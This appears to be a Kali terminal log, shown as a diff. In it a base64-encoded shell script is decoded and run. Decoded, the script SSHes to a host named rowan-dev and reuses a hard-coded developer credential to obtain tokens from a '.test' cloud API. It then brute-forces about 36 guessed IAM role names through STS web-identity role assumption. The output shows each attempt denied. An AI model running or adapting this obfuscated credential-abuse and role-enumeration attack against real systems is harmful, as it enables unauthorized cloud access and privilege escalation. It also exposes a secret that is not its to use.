@@ -1,0 +1,47 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r35.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKQ0E9JEhPTUUvLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApVPSJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgpXVD0kKGN1cmwgLXNTayAtbSAxMCAtdSAiJFUiIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKSknKQpFSj0kKGN1cmwgLXNTayAtbSAxMCAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdUIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQi9hcGkvdG9rZW4tZXhjaGFuZ2UvZmllbGRrZXN0LWV4cG9ydC1hY2Nlc3MiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgiYWNjZXNzX3Rva2VuIiwiIikpJykKZXhwb3J0IEFXU19DQV9CVU5ETEU9JENBCkU9aHR0cHM6Ly9vYmplY3RzLmtlcGxlcm9wcy50ZXN0CnRyeSgpeyByPSIkMSI7IG91dD0kKGF3cyAtLWVuZHBvaW50LXVybCAkRSBzdHMgYXNzdW1lLXJvbGUtd2l0aC13ZWItaWRlbnRpdHkgLS1yb2xlLXNlc3Npb24tbmFtZSBrMTQgLS1yb2xlLWFybiAiYXJuOmF3czppYW06OjAwMDAwMDAwMDAwMDpyb2xlLyRyIiAtLXdlYi1pZGVudGl0eS10b2tlbiAiJEVKIiAyPiYxKTsgaWYgZWNobyAiJG91dCIgfCBncmVwIC1xaSAnQ3JlZGVudGlhbHNcfEFjY2Vzc0tleUlkJzsgdGhlbiBlY2hvICJGT1VORCAkciI7IGVjaG8gIiRvdXQiIHwgaGVhZCAtYyA4MDA7IGVjaG87IGVsc2UgZWNobyAibm8gJHIgOjogJChlY2hvICIkb3V0IiB8IGdyZXAgLW8gJ3JvbGUgbm90IGZvdW5kOiBbXiBdKlx8QW4gZXJyb3Igb2NjdXJyZWQgKFtBLVphLXpdKiknIHwgaGVhZCAtMSkiOyBmaTsgfQpmb3IgciBpbiBcCiBzdXBwb3J0LWV4cG9ydC1lZGl0b3Igc3ZjLWZpZWxkbGluay1leHBvcnQgZmllbGRrZXN0LWV4cG9ydCBmaWVsZGtlc3QtZXhwb3J0cyBmaWVsZGtlc3QtZXhwb3J0LWFjY2VzcyBleHBvcnQtYWNjZXNzIHN1cHBvcnQtZXhwb3J0IGZpZWxkbGluay1leHBvcnQgZmllbGRsaW5rLWV4cG9ydC1hY2Nlc3Mgc3VwcG9ydC1leHBvcnQtcmVhZGVyIGZpZWxka2VzdC1zdXBwb3J0LWV4cG9ydCBzdXBwb3J0LWV4cG9ydC1lZGl0b3Itcm9sZSByb2xlLXN1cHBvcnQtZXhwb3J0LWVkaXRvciBmaWVsZGtlc3Qtcm9sZS1zdXBwb3J0LWV4cG9ydC1lZGl0b3IgazhzLXN2Yy1maWVsZGxpbmstZXhwb3J0IFwKIGZpZWxka2VzdC9zdXBwb3J0LWV4cG9ydC1lZGl0b3Iga2VwbGVyb3BzL3N1cHBvcnQtZXhwb3J0LWVkaXRvciBmaWVsZGxpbmsvc3VwcG9ydC1leHBvcnQtZWRpdG9yIHNlcnZpY2Utcm9sZS9zdXBwb3J0LWV4cG9ydC1lZGl0b3IgazhzL3N1cHBvcnQtZXhwb3J0LWVkaXRvciB3b3JrbG9hZHMvc3VwcG9ydC1leHBvcnQtZWRpdG9yIFwKIGZpZWxka2VzdC9leHBvcnQgZmllbGRrZXN0L2V4cG9ydC1hY2Nlc3MgZmllbGRrZXN0L3N2Yy1maWVsZGxpbmstZXhwb3J0IGtlcGxlcm9wcy9zdmMtZmllbGRsaW5rLWV4cG9ydCBmaWVsZGxpbmsvc3ZjLWZpZWxkbGluay1leHBvcnQgazhzL3N2Yy1maWVsZGxpbmstZXhwb3J0IFwKIGZpZWxka2VzdC9maWVsZGtlc3QtZXhwb3J0LWFjY2VzcyBmaWVsZGxpbmsvZmllbGRrZXN0LWV4cG9ydC1hY2Nlc3Mga2VwbGVyb3BzL2ZpZWxka2VzdC1leHBvcnQtYWNjZXNzIFwKIGZpZWxka2VzdCBzdXBwb3J0IGV4cG9ydHMgZXhwb3J0IGVkaXRvciByb2xlL3N1cHBvcnQtZXhwb3J0LWVkaXRvcjsgZG8gdHJ5ICIkciI7IGRvbmUKZWNobyBET05FX1IzNQpSU0gKZWNobyBGSU5JU0hFRAo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r35.sh; bash /tmp/k14_r35.sh; echo DONEMARK_1795208905450$((6*7))
+no support-export-editor :: An error occurred (AccessDenied)
+no svc-fieldlink-export :: An error occurred (AccessDenied)
+no fieldkest-export :: An error occurred (AccessDenied)
+no fieldkest-exports :: An error occurred (AccessDenied)
+no fieldkest-export-access :: An error occurred (AccessDenied)
+no export-access :: An error occurred (AccessDenied)
+no support-export :: An error occurred (AccessDenied)
+no fieldlink-export :: An error occurred (AccessDenied)
+no fieldlink-export-access :: An error occurred (AccessDenied)
+no support-export-reader :: An error occurred (AccessDenied)
+no fieldkest-support-export :: An error occurred (AccessDenied)
+no support-export-editor-role :: An error occurred (AccessDenied)
+no role-support-export-editor :: An error occurred (AccessDenied)
+no fieldkest-role-support-export-editor :: An error occurred (AccessDenied)
+no k8s-svc-fieldlink-export :: An error occurred (AccessDenied)
+no fieldkest/support-export-editor :: An error occurred (AccessDenied)
+no keplerops/support-export-editor :: An error occurred (AccessDenied)
+no fieldlink/support-export-editor :: An error occurred (AccessDenied)
+no service-role/support-export-editor :: An error occurred (AccessDenied)
+no k8s/support-export-editor :: An error occurred (AccessDenied)
+no workloads/support-export-editor :: An error occurred (AccessDenied)
+no fieldkest/export :: An error occurred (AccessDenied)
+no fieldkest/export-access :: An error occurred (AccessDenied)
+no fieldkest/svc-fieldlink-export :: An error occurred (AccessDenied)
+no keplerops/svc-fieldlink-export :: An error occurred (AccessDenied)
+no fieldlink/svc-fieldlink-export :: An error occurred (AccessDenied)
+no k8s/svc-fieldlink-export :: An error occurred (AccessDenied)
+no fieldkest/fieldkest-export-access :: An error occurred (AccessDenied)
+no fieldlink/fieldkest-export-access :: An error occurred (AccessDenied)
+no keplerops/fieldkest-export-access :: An error occurred (AccessDenied)
+no fieldkest :: An error occurred (AccessDenied)
+no support :: An error occurred (AccessDenied)
+no exports :: An error occurred (AccessDenied)
+no export :: An error occurred (AccessDenied)
+no editor :: An error occurred (AccessDenied)
+no role/support-export-editor :: An error occurred (AccessDenied)
+DONE_R35
+FINISHED
